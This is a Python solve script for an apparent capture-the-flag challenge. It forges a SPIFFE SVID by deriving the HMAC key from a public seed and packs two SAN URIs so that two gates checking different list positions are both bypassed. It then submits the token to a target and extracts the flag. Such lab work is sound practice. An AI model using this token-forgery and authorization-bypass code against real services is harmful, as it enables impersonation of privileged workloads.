#!/usr/bin/env python3
"""spiffe-mtls-ghost (652, cloud). Forge un SVID valide : la clé de signature est
dérivée du seed PUBLIC du bundle_config. Confused-deputy à 2 portes :
- Ingress Gate inspecte uris[0]  -> doit commencer par le préfixe sandbox
- Vault Gate inspecte uris[-1]   -> doit valoir le principal vault-controller
On met donc 2 URIs. CN != honeypot (sinon flag leurre).
Usage: python3 -I solve_spiffe.py https://HOST/
"""
import sys, json, hmac, hashlib, base64, urllib.request, urllib.error

SEED = "spiffe-workload-attestation-secret-k8s-mesh-2026"   # public (bundle_config.json)
TRUST = "darknova.io"
SANDBOX_PREFIX = "spiffe://darknova.io/ns/sandbox/"
VAULT_PRINCIPAL = "spiffe://darknova.io/ns/prod/sa/vault-controller"

def sign_svid(payload: dict) -> str:
    key = hashlib.sha256(SEED.encode()).digest()
    raw = json.dumps(payload, separators=(",", ":"), sort_keys=True).encode()
    sig = hmac.new(key, raw, hashlib.sha256).hexdigest()
    b64 = base64.urlsafe_b64encode(raw).decode().rstrip("=")
    return f"{b64}.{sig}"

def forge():
    payload = {
        "subject": {"CN": "frontend.sandbox"},            # != admin.internal (évite le honeypot)
        "san": {"uris": [
            SANDBOX_PREFIX + "frontend",                  # uris[0] passe l'ingress gate
            VAULT_PRINCIPAL,                               # uris[-1] passe la vault policy
        ]},
    }
    return sign_svid(payload)

def send(base, tok):
    for hdr in ({"Authorization": "Bearer " + tok}, {"X-SPIFFE-SVID": tok}):
        req = urllib.request.Request(base.rstrip("/") + "/", headers=hdr)
        try:
            with urllib.request.urlopen(req, timeout=20) as r:
                body = r.read().decode("utf-8", "replace"); code = r.status
        except urllib.error.HTTPError as e:
            code = e.code; body = e.read().decode("utf-8", "replace")
        except Exception as e:
            code = None; body = f"ERR {e}"
        print(f"[*] header={list(hdr)[0]} -> {code}: {body[:300]}")
        import re
        m = re.search(r'NCTF\{[^}]+\}', body)
        if m:
            print("\n[+] FLAG:", m.group()); return m.group()
    return None

if __name__ == "__main__":
    tok = forge()
    print("[*] token forgé:", tok[:60], "...")
    if len(sys.argv) >= 2:
        send(sys.argv[1], tok)
